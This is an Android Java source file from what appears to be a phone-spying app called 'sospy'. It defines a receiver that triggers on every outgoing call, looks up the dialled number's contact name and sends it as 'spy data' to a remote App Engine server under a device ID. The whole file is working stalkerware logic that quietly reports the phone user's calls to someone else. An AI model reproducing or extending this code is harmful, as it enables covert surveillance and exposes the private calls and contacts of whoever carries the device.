package com.prestomation.android.sospy.spy;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.util.Log;

public class OutgoingCall extends BroadcastReceiver 
{

        @Override
        public void onReceive(final Context context, Intent intent) 
        {
        		Log.i(SetupActivity.TAG, "OUTGOING CALL");
        	
                final Bundle bundle = intent.getExtras();
                final String phonenumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
                
                if(null == bundle)
                {
                	return;
                }
                
                final SharedPreferences prefs = Prefs.get(context);
                
                // Do the actual work in a worker thread. We don't want to tie up
        		// onStartCommand as this can tie up on UI/prompt a force close
        		new Thread(new Runnable() 
        		{
        			public void run() 
        			{
        				
                		String contact = ContactsUtility.getPhoneNumber(context.getContentResolver(), phonenumber);
                        Log.i(SetupActivity.TAG, "Outgoing call to # :" + contact);
                		String devID = prefs.getString(SetupActivity.PREF_DEVICE_ID, null);
                        AppEngineClient client = new AppEngineClient(devID);
                        
                        
                        String title = "Outgoing Call from " + contact;
                        String body = "";
                        String date = "";
        				client.sendSpyData(title, body, date);
        			}
        		}).start();
                
        }
}
